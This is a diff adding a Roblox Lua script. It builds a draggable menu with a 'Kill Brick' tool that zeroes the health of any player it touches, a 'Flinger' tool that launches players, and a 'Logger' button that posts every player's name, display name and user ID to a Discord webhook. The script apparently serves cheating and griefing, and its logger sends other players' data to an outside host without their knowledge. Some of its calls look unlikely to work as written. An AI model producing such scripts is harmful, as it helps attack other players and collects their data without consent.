@@ -1,0 +1,140 @@
+-- Initialize GUI
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local CloseButton = Instance.new("TextButton")
+local KillBrickButton = Instance.new("TextButton")
+local FlingerButton = Instance.new("TextButton")
+local LoggerButton = Instance.new("TextButton")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+-- MainFrame properties
+MainFrame.Size = UDim2.new(0, 300, 0, 200)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+MainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+-- CloseButton properties
+CloseButton.Size = UDim2.new(0, 25, 0, 25)
+CloseButton.Position = UDim2.new(1, -30, 0, 5)
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseButton.Parent = MainFrame
+
+-- KillBrickButton properties
+KillBrickButton.Size = UDim2.new(0, 250, 0, 50)
+KillBrickButton.Position = UDim2.new(0.5, -125, 0, 40)
+KillBrickButton.Text = "Kill Brick Tool"
+KillBrickButton.Parent = MainFrame
+
+-- FlingerButton properties
+FlingerButton.Size = UDim2.new(0, 250, 0, 50)
+FlingerButton.Position = UDim2.new(0.5, -125, 0, 100)
+FlingerButton.Text = "Flinger Tool"
+FlingerButton.Parent = MainFrame
+
+-- LoggerButton properties
+LoggerButton.Size = UDim2.new(0, 250, 0, 50)
+LoggerButton.Position = UDim2.new(0.5, -125, 0, 160)
+LoggerButton.Text = "Logger"
+LoggerButton.Parent = MainFrame
+
+-- Function to create a Kill Brick Tool
+local function createKillBrickTool()
+    local tool = Instance.new("Tool")
+    tool.RequiresHandle = false
+    tool.Name = "KillBrick"
+
+    tool.Activated:Connect(function()
+        local handle = Instance.new("Part")
+        handle.Size = Vector3.new(1, 1, 1)
+        handle.Transparency = 1
+        handle.CanCollide = false
+        handle.Parent = tool
+        handle.Touched:Connect(function(hit)
+            if hit.Parent:FindFirstChildOfClass("Humanoid") then
+                hit.Parent:FindFirstChildOfClass("Humanoid").Health = 0
+            end
+        end)
+    end)
+
+    tool.Parent = game.Players.LocalPlayer.Backpack
+end
+
+-- Function to create a Flinger Tool
+local function createFlingerTool()
+    local tool = Instance.new("Tool")
+    tool.RequiresHandle = false
+    tool.Name = "Flinger"
+
+    tool.Activated:Connect(function()
+        local handle = Instance.new("Part")
+        handle.Size = Vector3.new(1, 1, 1)
+        handle.Transparency = 1
+        handle.CanCollide = false
+        handle.Parent = tool
+        handle.Touched:Connect(function(hit)
+            if hit.Parent:FindFirstChildOfClass("Humanoid") then
+                hit.Parent:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Physics)
+                hit.Velocity = Vector3.new(0, 100, 0)
+            end
+        end)
+    end)
+
+    tool.Parent = game.Players.LocalPlayer.Backpack
+end
+
+-- Function to send player info to Discord webhook
+local function sendPlayerInfo()
+    local webhookUrl = "YOUR-WEBHOOK-URL-HERE"
+    local players = game.Players:GetPlayers()
+    
+    for _, player in pairs(players) do
+        local data = {
+            username = player.Name,
+            displayName = player.DisplayName,
+            userId = player.UserId
+        }
+        
+        local jsonData = game.HttpService:JSONEncode(data)
+        
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        
+        -- Send HTTP request to Discord webhook
+        local success, response = pcall(function()
+            return game.HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
+        end)
+        
+        if success then
+            print("Player info sent to Discord!")
+        else
+            warn("Failed to send player info to Discord:", response)
+        end
+    end
+end
+
+-- Event listener for Close button click
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- Event listener for Kill Brick Tool button click
+KillBrickButton.MouseButton1Click:Connect(function()
+    createKillBrickTool()
+end)
+
+-- Event listener for Flinger Tool button click
+FlingerButton.MouseButton1Click:Connect(function()
+    createFlingerTool()
+end)
+
+-- Event listener for Logger button click
+LoggerButton.MouseButton1Click:Connect(function()
+    sendPlayerInfo()
+end)
